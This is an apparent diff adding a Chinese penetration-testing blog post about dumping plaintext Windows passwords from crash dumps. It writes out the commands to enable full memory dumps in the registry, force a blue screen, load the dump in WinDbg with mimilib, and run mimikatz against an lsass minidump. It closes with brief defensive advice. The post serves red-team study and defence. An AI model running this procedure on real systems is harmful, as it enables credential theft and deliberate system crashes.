@@ -1,0 +1,345 @@
+I"�5<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>在上篇文章<a href="https://3gstudent.github.io/Mimilib%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90">《Mimilib利用分析》</a>提到mimilib可作为WinDbg的插件进行使用，所以本文将会详细介绍这个插件的用法，实现从内核模式转储文件中导出口令，结合利用思路给出防御建议</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>dump文件的分类</li>
+  <li>两种dump文件的导出方法</li>
+  <li>WinDbg环境配置</li>
+  <li>利用思路</li>
+  <li>防御建议</li>
+</ul>
+
+<h2 id="0x02-dump文件的分类">0x02 dump文件的分类</h2>
+<hr />
+
+<p>dump文件分为以下两类：</p>
+
+<h3 id="1user-mode-dump-file">1.User-Mode Dump File</h3>
+
+<p>即用户模式转储文件，分为以下两种：</p>
+
+<ul>
+  <li>Full User-Mode Dumps</li>
+  <li>Minidumps</li>
+</ul>
+
+<p>简单理解：通常是针对单个进程</p>
+
+<p>更多参考资料：</p>
+
+<p>https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/user-mode-dump-files</p>
+
+<p>创建方法：</p>
+
+<p>可以使用Procdump进行创建</p>
+
+<p>从用户模式转储文件导出口令的方法:</p>
+
+<p>可参考之前的文章<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E4%BB%8Elsass.exe%E8%BF%9B%E7%A8%8B%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE">《渗透基础-从lsass.exe进程导出凭据》</a></p>
+
+<h3 id="2kernel-mode-dump-files">2.Kernel-Mode Dump Files</h3>
+
+<p>即内核模式转储文件，分为以下五种：</p>
+
+<ul>
+  <li>Complete Memory Dump</li>
+  <li>Kernel Memory Dump</li>
+  <li>Small Memory Dump</li>
+  <li>Automatic Memory Dump</li>
+  <li>Active Memory Dump</li>
+</ul>
+
+<p>简单理解：包括所有进程的信息</p>
+
+<p>创建方法：</p>
+
+<p>启动创建转储文件的功能，在系统崩溃(BSOD)时将自动创建</p>
+
+<p>更多参考资料：</p>
+
+<p>https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/kernel-mode-dump-files</p>
+
+<h2 id="0x03-从内核模式转储文件导出口令的方法">0x03 从内核模式转储文件导出口令的方法</h2>
+<hr />
+
+<p>流程如下：</p>
+
+<p>1.开启转储文件的功能
+2.强制系统蓝屏(BSOD)，系统将会自动创建内核模式转储文件
+3.使用WinDbg加载转储文件，调用mimilib导出明文口令</p>
+
+<p>具体需要注意以下问题：</p>
+
+<h3 id="1开启转储文件的功能">1.开启转储文件的功能</h3>
+
+<p>对应注册表位置：<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CrashControl</code>，注册表项<code class="language-plaintext highlighter-rouge">CrashDumpEnabled</code>，类型为<code class="language-plaintext highlighter-rouge">REG_DWORD</code></p>
+
+<p>数值对应的功能如下：</p>
+
+<ul>
+  <li>0表示不启用</li>
+  <li>1表示完全内存转储</li>
+  <li>2表示核心内存转储</li>
+  <li>3表示内存转储</li>
+</ul>
+
+<p>查看这个注册表对应的cmd命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query hklm\SYSTEM\CurrentControlSet\Control\CrashControl /v CrashDumpEnabled
+</code></pre></div></div>
+
+<p>这里需要将键值设置为<code class="language-plaintext highlighter-rouge">1</code>，开启完全内存转储的功能，否则使用WinDbg访问进程lsass.exe的内存时会提示具有无效的页目录，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-27/2-1.png" alt="Alt text" /></p>
+
+<p>修改这个注册表对应的cmd命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hklm\SYSTEM\CurrentControlSet\Control\CrashControl /v CrashDumpEnabled /t REG_DWORD /d 1 /f
+</code></pre></div></div>
+
+<h3 id="2强制系统蓝屏bsod">2.强制系统蓝屏(BSOD)</h3>
+
+<h4 id="1通过结束属性为critical-process的进程导致bsod">(1)通过结束属性为critical process的进程导致BSOD</h4>
+
+<p>默认为critical process的系统进程如下：</p>
+
+<ul>
+  <li>csrss.exe</li>
+  <li>lsass.exe</li>
+  <li>services.exe</li>
+  <li>smss.exe</li>
+  <li>svchost.exe</li>
+  <li>wininit.exe</li>
+</ul>
+
+<p>这里也可以先将指定进程设置为critical process，结束该进程后也会导致BSOD</p>
+
+<p>具体细节可参考之前的文章<a href="https://3gstudent.github.io/%E7%BB%93%E6%9D%9F%E8%BF%9B%E7%A8%8B%E5%AF%BC%E8%87%B4BSOD%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90">《结束进程导致BSOD的利用分析》</a></p>
+
+<h4 id="2使用notmyfault">(2)使用NotMyFault</h4>
+
+<p>下载地址：</p>
+
+<p>https://docs.microsoft.com/en-us/sysinternals/downloads/notmyfault</p>
+
+<p>触发蓝屏(BSOD)的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>notmyfault.exe -accepteula /crash
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>NotMyFault还支持将当前系统挂起，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>notmyfault.exe -accepteula /hang
+</code></pre></div></div>
+
+<p>默认配置下，系统蓝屏(BSOD)后将会自动重启并生成文件<code class="language-plaintext highlighter-rouge">c:\windows\MEMORY.DMP</code></p>
+
+<h3 id="3使用windbg加载memorydmp">3.使用WinDbg加载MEMORY.DMP</h3>
+
+<p><strong>注：</strong></p>
+
+<p>WinDbg可以在安装SDK后自动安装</p>
+
+<p>参考资料：</p>
+
+<p>https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools</p>
+
+<p>使用WinDbg，选择打开<code class="language-plaintext highlighter-rouge">Crash Dump</code>，选择MEMORY.DMP</p>
+
+<p>获得dump文件详细信息的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!analyze -v
+</code></pre></div></div>
+
+<p>报错提示：<code class="language-plaintext highlighter-rouge">Kernel symbols are WRONG. Please fix symbols to do analysis.</code></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-27/2-2.png" alt="Alt text" /></p>
+
+<p>这里需要修复符号文件，可以选择以下三种解决方法：</p>
+
+<h3 id="1-using-the-_nt_symbol_path-environment-variable">(1) using the _NT_SYMBOL_PATH environment variable.</h3>
+
+<p>添加环境变量：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set _NT_SYMBOL_PATH=srv*c:\mysymbol*https://msdl.microsoft.com/download/symbols
+</code></pre></div></div>
+
+<h3 id="2-using-the--y--argument-when-starting-the-debugger">(2) using the -y <symbol_path> argument when starting the debugger.</symbol_path></h3>
+
+<p>使用WinDbg以指定参数启动</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>windbg.exe -y SRV*c:\mysymbol*http://msdl.microsoft.com/download/symbols
+</code></pre></div></div>
+
+<h3 id="3using-sympath-and-sympath">(3)using .sympath and .sympath+</h3>
+
+<p>添加<code class="language-plaintext highlighter-rouge">Symbol File Path</code></p>
+
+<p>WinDbg的命令行操作：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.sympath SRV*c:\mysymbol*http://msdl.microsoft.com/download/symbols
+</code></pre></div></div>
+
+<p>也可以通过界面操作实现</p>
+
+<p><code class="language-plaintext highlighter-rouge">File</code>-&gt;<code class="language-plaintext highlighter-rouge">Symbol File Path ...</code></p>
+
+<p>填入<code class="language-plaintext highlighter-rouge">SRV*c:\mysymbol*http://msdl.microsoft.com/download/symbols</code></p>
+
+<p>设置以后，需要的符号文件会自动从Microsoft公共符号服务器下载</p>
+
+<p>重新加载：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.Reload
+</code></pre></div></div>
+
+<p>测试：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!process 0 0 lsass.exe
+</code></pre></div></div>
+
+<p>加载正常，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-27/2-3.png" alt="Alt text" /></p>
+
+<p>如果这部分仍然失败，可尝试使用VPN连接互联网</p>
+
+<p>如果测试环境无法连接互联网，可以通过SymChk获取清单文件的方式下载符号文件</p>
+
+<p>参考资料：</p>
+
+<p>https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/using-a-manifest-file-with-symchk</p>
+
+<p>在无法连接互联网的计算机A上执行：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SymChk /om c:\Manifest\man.txt /id c:\test\MEMORY.DMP
+</code></pre></div></div>
+
+<p>获得文件<code class="language-plaintext highlighter-rouge">c:\Manifest\man.txt</code>，将其复制到可连接互联网的计算机B上，在计算机B上执行如下命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SymChk /im c:\test\man.txt /s srv*c:\mysymbolNew*https://msdl.microsoft.com/download/symbols
+</code></pre></div></div>
+
+<p>将会生成新的文件夹<code class="language-plaintext highlighter-rouge">c:\mysymbolNew</code>，将其复制到计算机A上，在计算机A上启动WinDbg并指定新的符号文件位置为<code class="language-plaintext highlighter-rouge">c:\mysymbolNew</code>，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.symfix c:\mysymbolNew
+</code></pre></div></div>
+
+<p>测试：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.Reload
+!process 0 0 lsass.exe
+</code></pre></div></div>
+
+<p>加载正常，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-27/2-6.png" alt="Alt text" /></p>
+
+<h3 id="4加载mimilib插件">4.加载mimilib插件</h3>
+
+<p>可参考之前的文章<a href="https://3gstudent.github.io/Mimilib%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90">《Mimilib利用分析》</a></p>
+
+<h3 id="1方法1">(1)方法1</h3>
+
+<p>将mimilib.dll保存至WinDbg的winext目录</p>
+
+<p>我的测试环境(Server2012R2x64)保存的路径为：<code class="language-plaintext highlighter-rouge">C:\Program Files\Debugging Tools for Windows (x64)\winext</code></p>
+
+<p>启动WinDbg</p>
+
+<p>加载插件的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.load mimilib
+</code></pre></div></div>
+
+<h3 id="2方法2">(2)方法2</h3>
+
+<p>直接加载mimilib的绝对路径，实例如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.load c:\test\mimilib
+</code></pre></div></div>
+
+<p>综上，搭建配置环境导出口令的完整命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.sympath SRV*c:\mysymbol*http://msdl.microsoft.com/download/symbols
+.reload
+!process 0 0 lsass.exe
+.process 890f4530
+.load c:\test\mimilib
+.reload
+!mimikatz
+</code></pre></div></div>
+
+<p>完整流程如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-27/2-4.png" alt="Alt text" /></p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-27/2-5.png" alt="Alt text" /></p>
+
+<p>将输出结果保存到文件中可使用以下命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.logopen c:\test\log.txt
+!mimikatz
+.logclose
+</code></pre></div></div>
+
+<h2 id="0x04-利用思路">0x04 利用思路</h2>
+<hr />
+
+<h3 id="1从用户模式转储文件导出口令">1.从用户模式转储文件导出口令</h3>
+
+<p>通过API <code class="language-plaintext highlighter-rouge">MiniDumpWriteDump()</code>获得进程lsass.exe的dump文件</p>
+
+<p>使用mimikatz从dump文件中导出口令，命令如下:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe log "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
+</code></pre></div></div>
+
+<h3 id="2从内核模式转储文件导出口令">2.从内核模式转储文件导出口令</h3>
+
+<p>开启转储文件的功能</p>
+
+<p>强制系统蓝屏(BSOD)</p>
+
+<p>使用WinDbg加载转储文件，调用mimilib导出明文口令</p>
+
+<h2 id="0x05-防御建议">0x05 防御建议</h2>
+<hr />
+
+<h3 id="1从用户模式转储文件导出口令-1">1.从用户模式转储文件导出口令</h3>
+
+<p>拦截API <code class="language-plaintext highlighter-rouge">MiniDumpWriteDump()</code>的行为，部分安全产品已经支持这个功能</p>
+
+<h3 id="2从内核模式转储文件导出口令-1">2.从内核模式转储文件导出口令</h3>
+
+<p>开启转储加密功能</p>
+
+<p>参考资料：</p>
+
+<p>https://docs.microsoft.com/en-us/windows-server/virtualization/hyper-v/manage/about-dump-encryption</p>
+
+<p><strong>注：</strong></p>
+
+<p>如果攻击者获得了系统的管理员权限，能够关闭转储加密的功能</p>
+
+<h2 id="0x06-小结">0x06 小结</h2>
+<hr />
+
+<p>本文分别介绍了从用户模式转储文件和内核模式转储文件导出口令的方法，结合利用思路给出防御建议</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
